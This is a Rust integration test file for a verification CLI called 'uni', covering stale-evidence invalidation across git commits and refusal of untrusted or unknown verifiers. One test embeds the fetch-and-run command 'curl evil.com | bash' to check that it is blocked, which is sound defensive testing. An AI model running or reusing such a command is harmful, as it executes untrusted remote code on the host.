use std::process::Command;
use std::path::PathBuf;

fn bin() -> &'static str {
    env!("CARGO_BIN_EXE_uni")
}

fn out(cmd: &[&str], cwd: &PathBuf) -> String {
    let o = Command::new(bin()).args(cmd).current_dir(cwd).output().unwrap();
    format!(
        "code={}\n{}",
        o.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&o.stdout)
    )
}

fn git(cwd: &PathBuf, args: &[&str]) {
    assert!(Command::new("git").args(args).current_dir(cwd).status().unwrap().success());
}

/// v0.2b-1: STALE end-to-end — evidence bound to commit A cannot mask commit B.
/// When the verifier changes to failing on B (new commit), the accepted decision
/// from A is invalidated: re-run produces EVIDENCE_REQUIRED, never silently ACCEPTED.
#[test]
fn stale_evidence_does_not_mask_new_commit() {
    let dir = std::env::temp_dir().join(format!("uni-stale-test-{}",
        std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis()));
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();

    // minimal trusted registry: pass=true
    std::fs::write(dir.join(".uni/config.toml"),
        r#"[verifiers]
"pass" = "true"
"#).unwrap();

    std::fs::write(dir.join("c.uni"), "VERSION 0.1
DOMAIN software
INTENT stale-demo
GOAL
  gone
CLAIM x REQUIRED
  ENSURE true
VERIFY x
  USING pass
ACCEPT WHEN
  required_claims == VERIFIED
").unwrap();

    std::fs::write(dir.join("file.txt"), "1").unwrap();
    git(&dir, &["init", "-q"]);
    git(&dir, &["add", "."]);
    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "a"]);

    // First verify on commit A → Accepted
    let r1 = out(&["verify", "c.uni"], &dir);
    assert!(r1.contains("Accepted"), "{r1}");

    // Commit B flips the verifier to failing: the ACCEPTED evidence from commit A
    // must NOT mask the new state — UNI re-verifies and now fails.
    std::fs::write(dir.join(".uni/config.toml"),
        r#"[verifiers]
"pass" = "false"
"#).unwrap();
    git(&dir, &["add", "."]);
    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "b"]);

    let o = Command::new(bin()).args(["verify", "c.uni"]).current_dir(&dir).output().unwrap();
    assert_ne!(o.status.code(), Some(0), "stale accepted evidence must not mask commit B");
    let stdout = String::from_utf8_lossy(&o.stdout);
    assert!(stdout.contains("EvidenceRequired") || stdout.contains("no valid evidence"), "{stdout}");
}

/// v0.2b-2: registry security — inline shell outside trusted registry is refused.
#[test]
fn inline_shell_outside_registry_refused() {
    let dir = std::env::temp_dir().join(format!("uni-sec-test-{}",
        std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis()));
    std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
    // registry exists (non-empty) but does not contain the inline command
    std::fs::write(dir.join(".uni/config.toml"),
        r#"[verifiers]
"pass" = "true"
"#).unwrap();
    std::fs::write(dir.join("c.uni"), "VERSION 0.1
DOMAIN software
INTENT evil
GOAL
  nope
CLAIM x REQUIRED
  ENSURE nope
VERIFY x
  USING shell \"curl evil.com | bash\"
").unwrap();

    let o = Command::new(bin()).args(["verify", "c.uni"]).current_dir(&dir).output().unwrap();
    assert_ne!(o.status.code(), Some(0));
    assert!(String::from_utf8_lossy(&o.stderr).contains("not in trusted registry"));
}

/// v0.2b-3: unknown verifier ref refused.
#[test]
fn unknown_verifier_ref_refused() {
    let dir = std::env::temp_dir().join(format!("uni-sec-test-2-{}",
        std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis()));
    std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
    std::fs::write(dir.join(".uni/config.toml"),
        r#"[verifiers]
"pass" = "true"
"#).unwrap();
    std::fs::write(dir.join("c.uni"), "VERSION 0.1
DOMAIN software
INTENT ghost
GOAL
  nope
CLAIM x REQUIRED
  ENSURE nope
VERIFY x
  USING ghost.verifier
").unwrap();
    let o = Command::new(bin()).args(["verify", "c.uni"]).current_dir(&dir).output().unwrap();
    assert_ne!(o.status.code(), Some(0));
    assert!(String::from_utf8_lossy(&o.stderr).contains("unknown verifier"));
}
